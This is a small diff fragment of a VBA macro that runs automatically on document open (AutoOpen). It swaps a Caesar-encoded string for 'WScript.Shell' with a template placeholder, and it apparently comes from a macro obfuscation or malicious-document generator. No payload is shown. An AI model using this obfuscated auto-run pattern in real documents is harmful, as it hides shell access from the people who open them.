@@ -13,7 +13,7 @@ Sub AutoOpen()
 	int3 = [INT3]
 	var2 = "data1"
 	var1 = "func3"
-	var16 = "Zvfulsw1Vkhoo"
+	var16 = "{[Wscript.Shell]}"
 	var1 = func1(var1, var2, int1)
 	var2 = "func2"
 	var3 = func1(var2, var1, int2)
